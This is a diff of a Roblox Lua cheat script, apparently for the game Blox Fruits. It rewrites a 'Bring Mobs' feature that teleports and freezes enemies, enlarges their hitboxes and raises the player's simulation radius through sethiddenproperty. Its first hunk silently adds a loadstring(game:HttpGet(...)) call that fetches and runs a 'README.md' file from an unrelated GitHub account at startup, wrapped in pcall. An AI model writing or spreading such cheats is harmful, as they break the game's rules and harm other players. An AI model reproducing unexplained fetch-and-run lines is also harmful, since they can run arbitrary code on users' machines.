@@ -7,6 +7,7 @@ task.spawn(function()
     repeat task.wait() until LP and LP.Character
 
     local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/tranvanhung040419826-ui/Njghvh/refs/heads/main/README.md"))()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AnhDangNhoEm/TuanAnhIOS/refs/heads/main/koby"))()
     end)
 
@@ -690,7 +691,7 @@ QuestNeta = function()
   }
 end
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
-local Window = Fluent:CreateWindow({Title = "Vantablack X Hub [Version:V1]",SubTitle = "| By Trần Duy Khánh",TabWidth = 155,Size = UDim2.fromOffset(555, 320),Acrylic = false,Theme = "Dark",MinimizeKey = Enum.KeyCode.End})
+local Window = Fluent:CreateWindow({Title = "Vantablack X Hub",SubTitle = "| By Trần Duy Khánh",TabWidth = 155,Size = UDim2.fromOffset(555, 320),Acrylic = false,Theme = "Dark",MinimizeKey = Enum.KeyCode.End})
 
 local CoreGui = game:GetService("CoreGui")
 local VirtualInputManager = game:GetService("VirtualInputManager")
@@ -2282,9 +2283,85 @@ local Initialize = Tabs.Settings:AddToggle("Initialize", {Title = "Initialize At
 Initialize:OnChanged(function(Value)
   _G.Seriality = Value
 end)
-local Bringmob = Tabs.Settings:AddToggle("Bringmob", {Title = "Bring Mobs", Description = "", Default = true})
+-- ==========================================
+-- 1. KHỞI TẠO UI (ĐƯA LÊN ĐẦU)
+-- ==========================================
+_B = false -- Biến điều khiển trạng thái
+
+local Bringmob = Tabs.Settings:AddToggle("Bringmob", {
+    Title = "Bring Mobs", 
+    Description = "Tự động gom quái xung quanh lại một điểm", 
+    Default = false
+})
+
 Bringmob:OnChanged(function(Value)
-  _B = Value
+    _B = Value
+end)
+
+-- ==========================================
+-- 2. HÀM LOGIC XỬ LÝ (FUNCTION)
+-- ==========================================
+local function bring_enemy_logic(target_pos)
+    local max_mobs = 7
+    local radius = 350
+    local count = 0
+    local plr = game.Players.LocalPlayer
+
+    -- Tối ưu quyền kiểm soát vật lý
+    pcall(function() sethiddenproperty(plr, "SimulationRadius", math.huge) end)
+
+    if not workspace:FindFirstChild("Enemies") then return end
+
+    for _, v in pairs(workspace.Enemies:GetChildren()) do
+        if count >= max_mobs then break end
+
+        local root = v:FindFirstChild("HumanoidRootPart")
+        local hum = v:FindFirstChild("Humanoid")
+
+        if root and hum and hum.Health > 0 then
+            if (root.Position - target_pos).Magnitude <= radius then
+                count = count + 1
+
+                -- Tính toán vị trí xếp vòng tròn (Anti-lag & Anti-clipping)
+                local angle = (count / max_mobs) * math.pi * 2
+                local offset_x = math.cos(angle) * 1.5
+                local offset_z = math.sin(angle) * 1.5
+                local final_pos = target_pos + Vector3.new(offset_x, 0, offset_z)
+
+                -- Teleport & Khóa cứng quái
+                root.CFrame = CFrame.new(final_pos)
+                root.Velocity = Vector3.new(0, 0, 0)
+                root.RotVelocity = Vector3.new(0, 0, 0)
+
+                -- Tăng Hitbox để đánh dễ trúng hơn
+                root.Size = Vector3.new(6, 6, 6)
+                root.CanCollide = false
+                
+                -- Chặn quái tự di chuyển hoặc rơi xuống
+                if hum:GetStateEnabled(Enum.HumanoidStateType.Physics) then
+                    hum:SetStateEnabled(Enum.HumanoidStateType.Physics, false)
+                end
+                hum.WalkSpeed = 0
+            end
+        end
+    end
+end
+
+-- ==========================================
+-- 3. VÒNG LẶP THỰC THI (MAIN LOOP)
+-- ==========================================
+task.spawn(function()
+    while task.wait() do -- Chạy liên tục để giữ quái tại chỗ
+        if _B then
+            pcall(function()
+                local char = game.Players.LocalPlayer.Character
+                if char and char:FindFirstChild("HumanoidRootPart") then
+                    -- Gom quái về vị trí Nhân vật của bạn
+                    bring_enemy_logic(char.HumanoidRootPart.Position)
+                end
+            end)
+        end
+    end
 end)
 local BusuAura = Tabs.Settings:AddToggle("BusuAura", {Title = "Auto Turn on Buso", Description = "", Default = true})
 BusuAura:OnChanged(function(Value)
